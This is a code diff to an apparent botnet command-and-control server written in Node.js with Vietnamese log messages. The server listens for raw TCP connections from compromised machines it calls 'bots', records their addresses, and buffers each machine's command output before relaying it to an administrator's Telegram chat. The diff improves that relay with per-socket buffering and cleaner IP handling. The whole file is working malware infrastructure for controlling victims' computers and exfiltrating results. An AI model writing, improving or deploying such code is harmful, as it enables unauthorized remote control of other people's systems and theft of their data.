@@ -7,6 +7,7 @@ const chatIdAdmin = 7371969470;
 
 const bot = new TelegramBot(token, { polling: true });
 const clients = new Map(); // socket => { ip, port }
+const buffers = new Map(); // socket => { data, timeout }
 
 function getIPv4(callback) {
   https.get('https://api.ipify.org?format=json', res => {
@@ -39,27 +40,43 @@ done`;
   });
 }
 
+function flushBuffer(socket) {
+  const info = clients.get(socket);
+  const bufInfo = buffers.get(socket);
+  if (!info || !bufInfo || !bufInfo.data) return;
+
+  bot.sendMessage(chatIdAdmin, `📡 ${info.ip}:${info.port} Kết quả:\n\`\`\`\n${bufInfo.data.trim()}\n\`\`\``, { parse_mode: 'Markdown' });
+  buffers.set(socket, { data: '', timeout: null });
+}
+
 const server = net.createServer(socket => {
-  const ip = socket.remoteAddress;
+  const ip = socket.remoteAddress.replace(/^.*:/, ''); // strip IPv6-mapped IPv4 prefix like ::ffff:
   const port = socket.remotePort;
   clients.set(socket, { ip, port });
+  buffers.set(socket, { data: '', timeout: null });
 
   bot.sendMessage(chatIdAdmin, `[+] Bot mới kết nối: ${ip}:${port}`);
 
   socket.on('data', data => {
-    const msg = data.toString().trim();
-    if (msg) {
-      bot.sendMessage(chatIdAdmin, `📡 [${ip}:${port}] Kết quả:\n\`\`\`\n${msg}\n\`\`\``, { parse_mode: 'Markdown' });
-    }
+    const str = data.toString();
+    const buf = buffers.get(socket);
+    if (!buf) return;
+
+    buf.data += str;
+
+    if (buf.timeout) clearTimeout(buf.timeout);
+    buf.timeout = setTimeout(() => flushBuffer(socket), 300); // flush sau 300ms nếu không có data mới
   });
 
   socket.on('close', () => {
     clients.delete(socket);
+    buffers.delete(socket);
     bot.sendMessage(chatIdAdmin, `[-] Bot mất kết nối: ${ip}:${port}`);
   });
 
   socket.on('error', () => {
     clients.delete(socket);
+    buffers.delete(socket);
     bot.sendMessage(chatIdAdmin, `[-] Bot lỗi kết nối: ${ip}:${port}`);
   });
 });
